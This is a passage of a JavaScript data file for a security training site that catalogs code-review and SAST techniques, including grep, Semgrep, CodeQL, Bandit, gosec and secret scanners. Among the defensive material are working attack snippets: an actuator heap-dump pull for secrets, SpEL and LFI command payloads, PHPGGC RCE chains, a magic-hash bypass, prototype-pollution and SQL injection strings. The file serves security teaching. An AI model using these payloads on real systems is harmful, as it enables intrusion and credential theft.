// Source Code Analysis techniques — split from WebApplications.jsx for size

export const sastTechniques = [
  {
    id: 'manual-review',
    title: 'Manual Code Review',
    subtitle: 'Trace user input from source to sink to identify injection points and auth gaps',
    tags: ['manual review', 'taint analysis', 'dangerous functions', 'route enumeration', 'sink tracing'],
    accentColor: 'cyan',
    overview: 'Manual code review traces user input from entry point to dangerous function. It finds logic flaws and auth gaps that automated tools miss, especially in complex business flows.',
    steps: [
      'Enumerate all routes: grep for decorators, router.get/post, urlpatterns — build a complete surface map',
      'Identify user-controlled sources: request.args, req.body, $_GET, $_POST, headers',
      'Trace each source to dangerous sinks: eval(), exec(), db.query(), innerHTML, render()',
      'Verify authentication decorators on every route — any missing decorator is an exposed endpoint',
      'Search for hardcoded secrets: API keys, passwords, JWT secrets embedded in source files',
      'Check for unsafe patterns: SQL string concatenation, eval of input, unsafe deserialization',
    ],
    commands: [
      {
        title: 'Route enumeration',
        code: `# Python (Flask/Django)
grep -rn "@app.route\\|@bp.route\\|path(\\|re_path(" . --include="*.py"
grep -rn "urlpatterns" . --include="*.py" -A 30

# Node.js (Express)
grep -rn "app\\.get\\|app\\.post\\|app\\.put\\|app\\.delete\\|router\\." . --include="*.js" --include="*.ts"

# Java (Spring)
grep -rn "@RequestMapping\\|@GetMapping\\|@PostMapping\\|@PutMapping\\|@DeleteMapping" . --include="*.java"

# PHP
grep -rn "Route::\\|\\$router->" . --include="*.php"

# Ruby on Rails
grep -rn "get '\\|post '\\|put '\\|delete '\\|resources :" config/routes.rb`
      },
      {
        title: 'Taint source identification',
        code: `# Python user-controlled input sources
grep -rn "request\\.args\\|request\\.form\\|request\\.json\\|request\\.data\\|request\\.headers" . --include="*.py"
grep -rn "request\\.GET\\|request\\.POST\\|request\\.body\\|request\\.META" . --include="*.py"

# JavaScript / Node.js
grep -rn "req\\.body\\|req\\.query\\|req\\.params\\|req\\.headers" . --include="*.js" --include="*.ts"

# PHP
grep -rn "\\$_GET\\|\\$_POST\\|\\$_REQUEST\\|\\$_COOKIE\\|\\$_FILES\\|\\$_SERVER" . --include="*.php"

# Java
grep -rn "@RequestParam\\|@PathVariable\\|@RequestBody\\|getParameter\\|getHeader" . --include="*.java"

# Ruby
grep -rn "params\\[\\|request\\.body\\|cookies\\[" . --include="*.rb"`
      },
      {
        title: 'Dangerous sink & hardcoded secret grep',
        code: `# OS Command execution
grep -rn "os\\.system\\|os\\.popen\\|subprocess\\|exec(\\|shell=True" . --include="*.py"
grep -rn "exec(\\|execSync(\\|spawn(\\|child_process" . --include="*.js"

# SQL queries (unsafe patterns)
grep -rn 'f"SELECT\\|f"INSERT\\|f"UPDATE\\|f"DELETE\\|%.*SELECT' . --include="*.py"
grep -rn '"SELECT.*"\\s*+\\|query.*+\\s*"' . --include="*.js" --include="*.java"
grep -rn '".*SELECT.*\\$\\|mysql_query\\|\\. \\$' . --include="*.php"

# Deserialization
grep -rn "pickle\\.loads\\|yaml\\.load(\\|marshal\\.loads\\|jsonpickle" . --include="*.py"
grep -rn "unserialize(\\|json_decode" . --include="*.php"
grep -rn "ObjectInputStream\\|readObject(\\|XMLDecoder" . --include="*.java"

# Hardcoded secrets
grep -rn "password\\s*=\\s*['\\\"][^'\\\"]*['\\\"]" . --include="*.py" --include="*.js"
grep -rn "api_key\\s*=\\|secret\\s*=\\|AWS_SECRET" . --include="*.py"
grep -rn "-----BEGIN.*PRIVATE KEY-----" . -r
grep -rn "AKIA[0-9A-Z]{16}" . -r

# SSRF sinks
grep -rn "requests\\.get\\|urllib\\.request\\|http\\.get\\|redirect(" . --include="*.py"

# Template injection sinks
grep -rn "render_template_string\\|Template(.*request\\|Environment.*undefined" . --include="*.py"`
      }
    ]
  },
  {
    id: 'sast-semgrep',
    title: 'SAST — Semgrep Deep Dive',
    subtitle: 'Pattern-based scanning, custom rules, taint mode, and CI/CD integration',
    tags: ['Semgrep', 'custom rules', 'taint mode', 'pattern matching', 'OWASP', 'metavariables', 'CI/CD'],
    accentColor: 'cyan',
    overview: 'Semgrep matches code patterns using an AST-aware engine that understands code structure, not just text. Write custom rules to catch application-specific vulnerabilities that generic rulesets miss. Taint mode traces user input to dangerous sinks across function calls.',
    steps: [
      'Run pre-built rulesets first: p/owasp-top-ten, p/sql-injection, p/xss, p/secrets, p/jwt',
      'Use --json output and pipe to jq to extract high-severity findings for triage',
      'Write custom rules using YAML patterns: match specific function calls with specific argument shapes',
      'Use metavariables ($X, $Y) to capture and constrain matched code elements',
      'Enable taint mode with sources and sinks to track user input across function boundaries',
      'Integrate into CI/CD with semgrep ci — fails the build on high-severity findings',
      'Use semgrep --test to validate that your custom rules match expected code samples',
    ],
    commands: [
      {
        title: 'Built-in rulesets',
        code: `# Full OWASP Top 10 scan
semgrep --config p/owasp-top-ten . --json -o owasp.json

# Specific vulnerability classes
semgrep --config p/sql-injection .
semgrep --config p/xss .
semgrep --config p/command-injection .
semgrep --config p/path-traversal .
semgrep --config p/ssrf .
semgrep --config p/xxe .
semgrep --config p/secrets .
semgrep --config p/jwt .
semgrep --config p/flask .
semgrep --config p/django .
semgrep --config p/express .
semgrep --config p/java .
semgrep --config p/php .

# Run multiple configs
semgrep --config p/owasp-top-ten --config p/secrets --config p/flask . \\
  --json -o combined.json

# High severity only, exclude tests
semgrep --config p/owasp-top-ten . \\
  --severity ERROR \\
  --exclude "test*" --exclude "*_test.py" --exclude "tests/"

# Parse JSON output
cat owasp.json | jq '.results[] | {file:.path, line:.start.line, rule:.check_id, msg:.extra.message}'`
      },
      {
        title: 'Custom rules — SQL injection',
        code: `# File: rules/sqli.yaml
rules:
  - id: python-fstring-sqli
    patterns:
      - pattern: |
          $CURSOR.execute(f"... {$VAR} ...")
    message: "SQL injection via f-string: $VAR interpolated directly into query"
    languages: [python]
    severity: ERROR
    metadata:
      cwe: "CWE-89"

  - id: python-format-sqli
    pattern-either:
      - pattern: $CURSOR.execute("..." % $VAR)
      - pattern: $CURSOR.execute("...".format(...))
    message: "SQL injection via string formatting in execute()"
    languages: [python]
    severity: ERROR

  - id: node-string-concat-sqli
    pattern: $DB.query("SELECT" + $INPUT)
    message: "SQL injection via string concatenation"
    languages: [javascript, typescript]
    severity: ERROR

semgrep --config rules/sqli.yaml . --json`
      },
      {
        title: 'Custom rules — command injection',
        code: `# File: rules/cmdi.yaml
rules:
  - id: python-os-system-user-input
    patterns:
      - pattern-either:
          - pattern: os.system($CMD % $X)
          - pattern: os.system(f"... {$X} ...")
          - pattern: os.system("..." + $X)
    message: "os.system() with potentially user-controlled input: $X"
    languages: [python]
    severity: ERROR

  - id: python-subprocess-shell-true
    pattern: subprocess.$FUNC(..., shell=True, ...)
    message: "subprocess with shell=True — dangerous if input is user-controlled"
    languages: [python]
    severity: WARNING

  - id: node-exec-user-input
    patterns:
      - pattern: exec($CMD)
      - pattern-not: exec("...", ...)
    message: "exec() with non-literal argument — potential command injection"
    languages: [javascript]
    severity: ERROR

  - id: php-exec-user-input
    pattern-either:
      - pattern: exec($_GET[$X])
      - pattern: exec($_POST[$X])
      - pattern: system($_REQUEST[$X])
    message: "OS command injection via user input"
    languages: [php]
    severity: ERROR`
      },
      {
        title: 'Custom rules — taint mode (SSRF)',
        code: `# File: rules/taint-ssrf.yaml
rules:
  - id: python-ssrf-requests
    mode: taint
    pattern-sources:
      - patterns:
          - pattern: request.args.get(...)
          - pattern: request.form.get(...)
          - pattern: request.json.get(...)
          - pattern: request.GET.get(...)
    pattern-sinks:
      - patterns:
          - pattern: requests.get($URL, ...)
          - pattern: requests.post($URL, ...)
          - pattern: urllib.request.urlopen($URL)
          - pattern: httpx.get($URL, ...)
    message: "SSRF: User-controlled input flows into HTTP request"
    languages: [python]
    severity: ERROR

  - id: node-ssrf-axios
    mode: taint
    pattern-sources:
      - pattern: req.query.$X
      - pattern: req.body.$X
      - pattern: req.params.$X
    pattern-sinks:
      - pattern: axios.get($URL, ...)
      - pattern: fetch($URL, ...)
      - pattern: http.get($URL, ...)
    message: "SSRF: User-controlled input flows into outbound HTTP request"
    languages: [javascript, typescript]
    severity: ERROR`
      },
      {
        title: 'Custom rules — SSTI & XSS',
        code: `# File: rules/xss-ssti.yaml
rules:
  - id: python-jinja2-ssti
    patterns:
      - pattern: jinja2.Template($USER_INPUT).render(...)
      - pattern-not: jinja2.Template("...").render(...)
    message: "SSTI: User-controlled string passed to jinja2.Template()"
    languages: [python]
    severity: ERROR

  - id: flask-render-template-string-ssti
    patterns:
      - pattern: flask.render_template_string($X, ...)
      - pattern-not: flask.render_template_string("...", ...)
    message: "SSTI: render_template_string() with non-literal template"
    languages: [python]
    severity: ERROR

  - id: react-dangerous-inner-html
    pattern: "dangerouslySetInnerHTML={{__html: $X}}"
    message: "XSS risk: dangerouslySetInnerHTML with potentially unsanitized value"
    languages: [javascript, typescript]
    severity: WARNING

  - id: node-res-send-xss
    mode: taint
    pattern-sources:
      - pattern: req.query.$X
      - pattern: req.body.$X
    pattern-sinks:
      - pattern: res.send($TAINTED)
      - pattern: res.write($TAINTED)
    message: "XSS: User input reflected directly in HTTP response"
    languages: [javascript]
    severity: ERROR`
      },
      {
        title: 'CI/CD integration',
        code: `# GitHub Actions — .github/workflows/semgrep.yml
name: Semgrep SAST
on: [push, pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/secrets
            p/sql-injection
          generateSarif: "1"
      - uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: semgrep.sarif

# GitLab CI
semgrep-sast:
  image: returntocorp/semgrep
  script:
    - semgrep --config p/owasp-top-ten --config p/secrets .
      --json -o gl-sast-report.json --error
  artifacts:
    reports:
      sast: gl-sast-report.json

# Pre-commit — .pre-commit-config.yaml
repos:
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.45.0
    hooks:
      - id: semgrep
        args: ['--config', 'p/secrets', '--error']`
      }
    ]
  },
  {
    id: 'sast-bandit-gosec',
    title: 'SAST — Bandit (Python) & gosec (Go)',
    subtitle: 'Full B-code and G-code reference — language-specific static analysis',
    tags: ['Bandit', 'gosec', 'Python', 'Go', 'B602', 'B608', 'G304', 'G402', 'severity'],
    accentColor: 'cyan',
    overview: 'Bandit maps every finding to a B-code test ID corresponding to a specific vulnerability class. gosec does the same for Go with G-codes. Knowing the full test ID catalog lets you precisely target the highest-impact checks and suppress known false positives.',
    steps: [
      'Run bandit -r . -ll to scan all Python files at medium severity and above',
      'Use -t to target specific test IDs: B602 (subprocess shell), B608 (SQL string concat), B301 (pickle)',
      'Run bandit -r . -t B601,B602,B608 to focus only on the highest-impact checks',
      'Run gosec ./... on Go — prioritize G304 (file traversal), G402 (TLS skip verify), G201/G202 (SQLi)',
      'Suppress verified false positives with # nosec B-code (bandit) or // #nosec G-code (gosec)',
    ],
    commands: [
      {
        title: 'Bandit usage & full B-code reference',
        code: `# Usage
bandit -r . -ll                      # Medium+ severity
bandit -r . -lll                     # High only
bandit -r . -f json -o bandit.json
bandit -r . -f html -o bandit.html
bandit -r . -x tests/,venv/,migrations/
bandit -r . -t B602,B608             # Target specific tests
bandit -r . --skip B101,B311         # Skip noisy tests

# ─── COMPLETE B-CODE REFERENCE ──────────────────────────────
# B102  exec used
# B103  setting permissions
# B104  hardcoded bind all interfaces (0.0.0.0)
# B105  hardcoded password string literal           ← HIGH
# B106  hardcoded password function argument
# B107  hardcoded password default argument
# B108  insecure use of temp file/dir
# B110  try/except pass (swallowed exception)
# B201  Flask debug=True                            ← HIGH
# B202  tarfile unsafe members
# B301  pickle.loads — arbitrary object exec        ← CRITICAL
# B302  marshal.loads
# B303  md5 / sha1 (weak hash)
# B304  DES / RC2 / RC4 / Blowfish (weak cipher)
# B305  cipher ECB mode
# B306  mktemp_q — predictable temp file
# B307  eval() used                                 ← CRITICAL
# B308  mark_safe in Django (XSS)
# B311  random — not crypto-safe
# B313-B320  XML parsers — XXE risk
# B321  FTP — plaintext protocol
# B323  unverified SSL context
# B324  hashlib insecure hash
# B401  import telnetlib
# B403  import pickle
# B404  import subprocess
# B501  requests with verify=False                  ← HIGH
# B502  ssl.wrap_socket no cert requirements
# B503  ssl bad ciphers
# B505  weak crypto key (RSA/DSA < 2048 bits)
# B506  yaml.load() without Loader                  ← CRITICAL
# B507  paramiko missing host key validation
# B601  paramiko exec_command
# B602  subprocess.Popen with shell=True            ← CRITICAL
# B603  subprocess.Popen without shell=True
# B604  function call with shell=True               ← HIGH
# B605  os.system()                                 ← CRITICAL
# B606  os.popen()                                  ← HIGH
# B607  partial executable path
# B608  SQL injection via string construction       ← CRITICAL
# B609  wildcard injection in Linux commands
# B610  Django extra() used
# B611  Django RawSQL used
# B701  jinja2 autoescape=False                     ← HIGH
# B702  use of mako templates
# B703  Django mark_safe`
      },
      {
        title: 'gosec usage & full G-code reference',
        code: `# Usage
gosec ./...
gosec -fmt json ./... > gosec.json
gosec -fmt sarif ./... > gosec.sarif
gosec -include G304,G402,G501 ./...
gosec -exclude G104 ./...           # Exclude unhandled errors (noisy)
gosec -severity high ./...

# ─── COMPLETE G-CODE REFERENCE ──────────────────────────────
# G101  hardcoded credentials                       ← HIGH
# G102  binding to all network interfaces
# G103  use of unsafe package
# G104  errors unhandled (very noisy — often excluded)
# G106  ssh.InsecureIgnoreHostKey                   ← HIGH
# G107  URL to HTTP request as taint input (SSRF)   ← CRITICAL
# G108  profiling endpoint auto-exposed /debug/pprof
# G109  potential integer overflow
# G110  decompression bomb (zip bomb DoS)
# G111  file path joined with user input            ← HIGH
# G112  insecure ReadHeaderTimeout on http.Server
# G114  net/http serve without timeout
# G201  SQL query via fmt.Sprintf (format string)   ← CRITICAL
# G202  SQL query via string concatenation          ← CRITICAL
# G203  unescaped data in HTML template             ← HIGH
# G204  subprocess launched with variable           ← CRITICAL
# G301  poor dir permissions (mkdir)
# G302  poor file permissions (chmod)
# G303  temp file in shared /tmp
# G304  file path as taint input (path traversal)   ← CRITICAL
# G305  file traversal extracting zip archive
# G306  poor permissions writing new file
# G401  DES or RC2
# G402  TLS InsecureSkipVerify = true               ← CRITICAL
# G403  RSA key length < 2048 bits
# G404  insecure math/rand instead of crypto/rand   ← HIGH
# G501  import md5 (weak hash)                      ← HIGH
# G502  import des (weak cipher)
# G503  import rc4 (weak cipher)
# G505  import sha1 (weak hash)                     ← HIGH
# G601  implicit memory aliasing in for loop

# Suppress false positive
// #nosec G204 -- input validated by allowlist before this point
exec.Command(input)`
      }
    ]
  },
  {
    id: 'sast-codeql',
    title: 'SAST — CodeQL Deep Dive',
    subtitle: 'Semantic taint analysis, custom QL queries, and GitHub Advanced Security',
    tags: ['CodeQL', 'QL', 'taint tracking', 'data flow', 'GitHub Advanced Security', 'SARIF', 'custom queries'],
    accentColor: 'cyan',
    overview: 'CodeQL converts source code into a relational database and queries it using QL — a declarative logic language. It performs interprocedural taint tracking, following user input across function calls, object assignments, and library boundaries that Semgrep patterns cannot reach.',
    steps: [
      'Create a CodeQL database using codeql database create for the target language',
      'Run the security-extended query suite for the most comprehensive built-in coverage',
      'Write custom QL queries with TaintTracking::Configuration to model app-specific sources and sinks',
      'Add sanitizer predicates to reduce false positives when input validation is present',
      'Upload SARIF results to GitHub Security tab to display findings inline in pull requests',
      'Use the CodeQL VS Code extension for interactive query writing and data flow path exploration',
    ],
    commands: [
      {
        title: 'Database creation — all languages',
        code: `# Python
codeql database create codeql-db --language=python --source-root=. --overwrite

# JavaScript / TypeScript
codeql database create codeql-db --language=javascript --source-root=.

# Java (requires build)
codeql database create codeql-db --language=java --command="mvn clean install -DskipTests"

# Go
codeql database create codeql-db --language=go --source-root=.

# C/C++
codeql database create codeql-db --language=cpp --command="make" --source-root=.

# C# (.NET)
codeql database create codeql-db --language=csharp --command="dotnet build"

# Run security-extended suite
codeql database analyze codeql-db \\
  codeql/python-queries:codeql-suites/python-security-extended.qls \\
  --format=sarif-latest --output=results.sarif

# Parse SARIF output
cat results.sarif | jq '.runs[].results[] | {rule:.ruleId, file:.locations[0].physicalLocation.artifactLocation.uri, line:.locations[0].physicalLocation.region.startLine, msg:.message.text}'`
      },
      {
        title: 'Custom QL — Python SQL injection (path-problem)',
        code: `/**
 * @name SQL injection from Flask request parameters
 * @description Tracks user input from Flask request into raw SQL
 * @kind path-problem
 * @id python/flask-sqli-custom
 * @problem.severity error
 * @tags security external/cwe/cwe-089
 */
import python
import semmle.python.dataflow.new.DataFlow
import semmle.python.dataflow.new.TaintTracking
import semmle.python.ApiGraphs

class FlaskRequestSource extends DataFlow::Node {
  FlaskRequestSource() {
    exists(DataFlow::AttrRead ar |
      ar.getObject() = API::moduleImport("flask").getMember("request").getAUse() and
      ar.getAttributeName() in ["args", "form", "json", "data", "headers", "values"] and
      this = ar
    )
  }
}

class SqlExecSink extends DataFlow::Node {
  SqlExecSink() {
    exists(DataFlow::CallCfgNode call |
      call.getFunction().(DataFlow::AttrRead).getAttributeName() in
        ["execute", "executemany", "raw", "extra"] and
      this = call.getArg(0)
    )
  }
}

class SqlInjectionConfig extends TaintTracking::Configuration {
  SqlInjectionConfig() { this = "SqlInjectionConfig" }
  override predicate isSource(DataFlow::Node node) { node instanceof FlaskRequestSource }
  override predicate isSink(DataFlow::Node node) { node instanceof SqlExecSink }
}

import DataFlow::PathGraph
from SqlInjectionConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "SQL injection: user input from $@ flows into raw SQL execution",
  source.getNode(), "this request parameter"`
      },
      {
        title: 'Custom QL — SSRF taint query',
        code: `/**
 * @name SSRF via user-controlled URL
 * @kind path-problem
 * @id python/ssrf-custom
 * @problem.severity error
 * @tags security external/cwe/cwe-918
 */
import python
import semmle.python.dataflow.new.TaintTracking
import semmle.python.ApiGraphs

class UserInputSource extends DataFlow::Node {
  UserInputSource() {
    this = API::moduleImport("flask").getMember("request")
              .getMember(["args","form","json","values"]).getAUse()
  }
}

class HttpRequestSink extends DataFlow::Node {
  HttpRequestSink() {
    exists(DataFlow::CallCfgNode c |
      c.getFunction() = API::moduleImport("requests")
                           .getMember(["get","post","put","delete","request"]).getAUse() and
      this = c.getArg(0)
    )
    or
    exists(DataFlow::CallCfgNode c |
      c.getFunction() = API::moduleImport("urllib.request").getMember("urlopen").getAUse() and
      this = c.getArg(0)
    )
  }
}

class SsrfConfig extends TaintTracking::Configuration {
  SsrfConfig() { this = "SsrfConfig" }
  override predicate isSource(DataFlow::Node n) { n instanceof UserInputSource }
  override predicate isSink(DataFlow::Node n) { n instanceof HttpRequestSink }
}

import DataFlow::PathGraph
from SsrfConfig cfg, DataFlow::PathNode src, DataFlow::PathNode sink
where cfg.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "SSRF: user input flows to HTTP request URL"`
      },
      {
        title: 'GitHub Actions integration',
        code: `# .github/workflows/codeql.yml
name: CodeQL Analysis
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'   # Weekly Monday

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write   # Required for SARIF upload

    strategy:
      matrix:
        language: ['python', 'javascript']

    steps:
      - uses: actions/checkout@v3
      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: \${{ matrix.language }}
          queries: security-extended
      - name: Autobuild
        uses: github/codeql-action/autobuild@v2
      - name: Analyze
        uses: github/codeql-action/analyze@v2
        with:
          category: "/language:\${{ matrix.language }}"
          upload: true`
      }
    ]
  },
  {
    id: 'sast-secrets-deps',
    title: 'SAST — Secret Scanning & Dependency Audits',
    subtitle: 'Trufflehog, Gitleaks, trivy, npm audit — leaked secrets and CVEs in deps',
    tags: ['Trufflehog', 'Gitleaks', 'trivy', 'npm audit', 'pip-audit', 'SBOM', 'CVE', 'SCA'],
    accentColor: 'cyan',
    overview: 'Secrets committed to git history persist even after deletion — every commit must be scanned. Dependency scanning (SCA) identifies third-party packages with known CVEs using OSV, NVD, and GitHub Advisory. Both are critical parts of a complete code review.',
    steps: [
      'Run trufflehog against the full git history — secrets survive deletions and file renames',
      'Run gitleaks on the working tree AND all branches for comprehensive coverage',
      'Use trivy fs for filesystem scanning including OS packages and language deps',
      'Run npm audit / pip-audit / govulncheck for language-specific dep CVE checks',
      'Generate an SBOM with syft or trivy for a complete software bill of materials',
      'Block deployments on CRITICAL CVEs using --exit-code 1 in CI/CD pipelines',
    ],
    commands: [
      {
        title: 'Trufflehog',
        code: `# Scan full git history (most thorough)
trufflehog git file:///path/to/repo --json | jq .

# Scan remote GitHub repo
trufflehog github --repo=https://github.com/org/repo --json

# Scan entire GitHub org
trufflehog github --org=target-org --json

# Only verified secrets (fewer false positives)
trufflehog git file:///path/to/repo --only-verified --json

# Scan filesystem, Docker image, S3
trufflehog filesystem /path/to/dir --json
trufflehog docker --image=myapp:latest
trufflehog s3 --bucket=my-bucket

# Extract readable output
trufflehog git file:///repo --json 2>/dev/null | \\
  jq -r '.SourceMetadata.Data.Git | "\\(.commit) — \\(.file)::\\(.line)"'`
      },
      {
        title: 'Gitleaks',
        code: `# Scan current working tree
gitleaks detect --source . -v

# Scan all git history across all branches
gitleaks detect --source . --log-opts="--all" -v

# JSON output
gitleaks detect --source . --report-format json --report-path leaks.json

# Custom rules — .gitleaks.toml
[[rules]]
id = "custom-api-key"
description = "Custom App API Key"
regex = '''myapp_[a-zA-Z0-9]{32}'''
tags = ["api"]

gitleaks detect --source . --config .gitleaks.toml

# Pre-commit (scan staged files before commit)
gitleaks protect --staged -v

# GitHub Actions
- name: Gitleaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`
      },
      {
        title: 'Trivy & language-specific dep audits',
        code: `# Trivy filesystem scan
trivy fs . --severity HIGH,CRITICAL
trivy fs . --scanners vuln,secret,misconfig
trivy fs . --format json --output trivy.json --severity HIGH,CRITICAL
trivy fs . --format sarif --output trivy.sarif     # GitHub upload
trivy fs . --ignore-unfixed --severity HIGH,CRITICAL  # Reduce noise
trivy fs . --exit-code 1 --severity CRITICAL        # Fail CI

# Docker image
trivy image myapp:latest --severity HIGH,CRITICAL

# Generate SBOM
trivy fs . --format cyclonedx --output sbom.json
syft . -o spdx-json > sbom-spdx.json

# ── Language-specific audits ──────────────────────
# Node.js
npm audit
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical") | .key'
npm audit fix
npx audit-ci --critical

# Python
pip-audit -r requirements.txt --format json
safety check -r requirements.txt --full-report

# Go
govulncheck ./...

# Ruby
bundle audit check --update

# Java / Gradle
mvn org.owasp:dependency-check-maven:check
./gradlew dependencyCheckAnalyze

# PHP
composer audit

# Rust
cargo audit`
      }
    ]
  },
  {
    id: 'framework-vulns',
    title: 'Framework-Specific Vulnerabilities',
    subtitle: 'Django, Rails, Spring Boot, PHP, Express — recurring vuln patterns',
    tags: ['Django', 'Rails', 'Spring Boot', 'PHP', 'Express', 'Laravel', 'OGNL', 'EL injection', 'type juggling'],
    accentColor: 'cyan',
    overview: 'Each framework has recurring vulnerability patterns tied to its ORM, template engine, and configuration. Knowing these patterns allows targeted review without reading the entire codebase.',
    steps: [
      'Django: look for raw() and extra() ORM calls with string interpolation, and template injection from user-controlled template strings',
      'Rails: test params.permit(:all) for mass assignment, and string-interpolated where() queries for SQLi',
      'Spring Boot: enumerate /actuator endpoints — /env and /heapdump can expose secrets and memory',
      'PHP: test loose equality (==) with type juggling payloads, and unserialize() with PHPGGC gadget chains',
      'Express.js: test prototype pollution via merge/extend endpoints with __proto__ injection',
    ],
    commands: [
      {
        title: 'Django & Rails',
        code: `# Django — raw SQL injection
# Vulnerable: User.objects.raw("SELECT * FROM user WHERE id=" + user_id)
# Exploit:    user_id = "1 OR 1=1"
# Fix:        User.objects.raw("SELECT * FROM user WHERE id=%s", [user_id])

# Django — template injection (user controls template string)
from django.template import Template, Context
template = Template(user_input)   # SSTI if input contains {{ }}
# Fix: use render_to_string with a trusted template name

# Django misconfigs
grep -rn "DEBUG\\s*=\\s*True" . --include="*.py"
grep -rn "SECRET_KEY\\s*=" . --include="*.py"
grep -rn "ALLOWED_HOSTS.*\\*" . --include="*.py"

# Rails — SQL string interpolation
# Vulnerable: User.where("name = '#{params[:name]}'")
# Exploit:    name='; DROP TABLE users; --
# Fix:        User.where("name = ?", params[:name])

# Rails — mass assignment
# Vulnerable: @user = User.new(params[:user])
# Exploit:    POST /users params[user][admin]=1

# Rails — YAML deserialization
# Vulnerable: YAML.load(user_input)
# Fix:        YAML.safe_load(user_input)`
      },
      {
        title: 'Spring Boot & Java',
        code: `# Actuator endpoint enumeration
curl http://target.com/actuator
curl http://target.com/actuator/env        # Env vars and secrets
curl http://target.com/actuator/heapdump   # Full JVM heap dump
curl http://target.com/actuator/mappings   # All URL mappings
curl http://target.com/actuator/loggers    # Change log levels remotely

# Extract secrets from heap dump
wget http://target.com/actuator/heapdump -O heap.bin
strings heap.bin | grep -iE "password|secret|token|api.key|jdbc"

# Spring EL (SpEL) injection
# Payload: T(java.lang.Runtime).getRuntime().exec('id')
grep -rn "SpelExpressionParser\\|parseExpression(" . --include="*.java"
grep -rn "@Value.*#\{\\|\\.parseExpression(" . --include="*.java"

# Spring Security misconfig
grep -rn "permitAll()\\|antMatchers.*permitAll\\|csrf().disable()" . --include="*.java"

# Native query injection in Spring Data JPA
grep -rn "@Query.*nativeQuery.*=.*true" . --include="*.java" -A 2
grep -rn "createNativeQuery(\\|createQuery(\"" . --include="*.java"`
      },
      {
        title: 'PHP type juggling & deserialization',
        code: `# PHP type juggling — loose comparison ==
# Magic hash bypass: "0e123..." == 0 evaluates to TRUE in PHP
# MD5("240610708") = 0e462097431906509019562988736854
# SHA1("aaroZmOk")  = 0e66507019969427134894567494305185566735
# Submit: token=0e462097431906509019562988736854 → bypasses token check

# PHP unserialize gadget chains (PHPGGC)
phpggc -l                           # List all chains
phpggc Laravel/RCE1 system id       # Generate payload
phpggc Symfony/RCE4 exec id
phpggc Laravel/RCE1 system id -b    # Base64 encoded
phpggc Laravel/RCE1 system 'id' -u  # URL-encoded

# Most impactful chains:
# Laravel/RCE1  — Laravel 5.5–8 (Faker)
# Laravel/RCE4  — Laravel 8+
# Symfony/RCE4  — Symfony 4.x
# Monolog/RCE1  — Monolog (common in many PHP apps)
# Guzzle/RCE1   — Guzzle HTTP library

# PHP file inclusion sinks
grep -rn "include(\$_\\|require(\$_" . --include="*.php"
# Payloads:
# ?page=php://filter/convert.base64-encode/resource=index.php
# ?page=data://text/plain,<?php system('id')?>`
      },
      {
        title: 'Express.js & Node.js',
        code: `# Prototype pollution via lodash merge
grep -rn "merge(\\|extend(\\|assign(\\|deepMerge(" . --include="*.js"

# Exploit
curl -X POST https://target.com/api/settings \\
  -H "Content-Type: application/json" \\
  -d '{"__proto__":{"isAdmin":true}}'

# Via constructor key
# {"constructor":{"prototype":{"isAdmin":true}}}

# Node.js eval / code exec
grep -rn "eval(req\\.\\|new Function(.*body\\|vm\\.runIn" . --include="*.js"

# Express — res.send with user input (XSS)
grep -rn "res\\.send(req\\.\\|res\\.write(req\\." . --include="*.js"

# MongoDB $where JS injection
# db.users.find({$where: "this.username == '"+username+"'"})
# Inject: username = "'; return 1; var x='"`
      }
    ]
  },
  {
    id: 'dangerous-functions',
    title: 'Dangerous Functions Reference',
    subtitle: 'Per-language catalog of dangerous sinks by vulnerability class',
    tags: ['sink catalog', 'Python', 'JavaScript', 'Java', 'PHP', 'Go', 'Ruby', 'command injection', 'SQLi'],
    accentColor: 'cyan',
    overview: 'A complete per-language catalog of dangerous functions by vulnerability class. Use as a grep reference during manual code review to rapidly locate the highest-risk code patterns.',
    steps: [
      'Start with command injection sinks — any with user input is critical severity',
      'Check SQL sinks for string concatenation vs parameterized queries',
      'Deserialization functions with user input = likely RCE',
      'Template rendering with user-controlled template strings = SSTI',
      'File operations with user-controlled paths = path traversal / LFI',
    ],
    commands: [
      {
        title: 'Python sinks by vuln class',
        code: `# ── COMMAND INJECTION ─────────────────────────────
os.system(cmd)
os.popen(cmd)
subprocess.run(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
subprocess.call(cmd, shell=True)
subprocess.check_output(cmd, shell=True)
eval(user_input)                  # Code execution
exec(user_input)
compile(user_input, "<str>", "exec")
__import__(user_input)

# ── SQL INJECTION ──────────────────────────────────
cursor.execute("SELECT..." + input)
cursor.execute(f"SELECT...{input}")
cursor.execute("SELECT..." % input)
cursor.execute("SELECT...".format(input))
session.query(Model).filter("id=" + input)
Model.objects.raw("SELECT..." + input)
Model.objects.extra(where=["..." % input])

# ── DESERIALIZATION ────────────────────────────────
pickle.loads(data)                # RCE on load
pickle.load(file)
cPickle.loads(data)
yaml.load(data)                   # CRITICAL — use safe_load()
yaml.full_load(data)              # Same risk
jsonpickle.decode(data)
dill.loads(data)
marshal.loads(data)
shelve.open(filename)             # Uses pickle internally

# ── SSTI ───────────────────────────────────────────
jinja2.Template(user_input).render()
flask.render_template_string(user_input)
mako.template.Template(user_input)
django.template.Template(user_input)

# ── FILE / PATH TRAVERSAL ─────────────────────────
open(user_path)
os.path.join(base, input)         # Bypass with absolute path
tarfile.extractall(path)          # Zip Slip
zipfile.extractall(path)          # Zip Slip

# ── SSRF ───────────────────────────────────────────
requests.get(user_url)
requests.post(user_url)
urllib.request.urlopen(user_url)
urllib.request.urlretrieve(user_url)
httpx.get(user_url)`
      },
      {
        title: 'JavaScript / Node.js sinks',
        code: `// ── COMMAND INJECTION ──────────────────────────────
exec(cmd)                         // child_process — shell expansion
execSync(cmd)
